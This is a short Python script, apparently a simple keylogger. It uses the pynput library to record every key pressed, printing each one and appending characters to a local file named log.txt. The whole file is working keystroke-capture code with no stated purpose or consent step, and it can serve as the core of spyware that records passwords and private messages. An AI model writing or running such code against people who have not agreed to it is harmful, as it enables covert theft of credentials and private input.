from pynput import keyboard

def passkey(key):
  print(str(key))
  with open ("log.txt",'a') as logKey:
    try:
      char=key.char
      logKey.write(char)
    except:
      print("Error")
if __name__=="__main__":
  Listener=keyboard.Listener(on_press=passkey)
  Listener.start()
  input()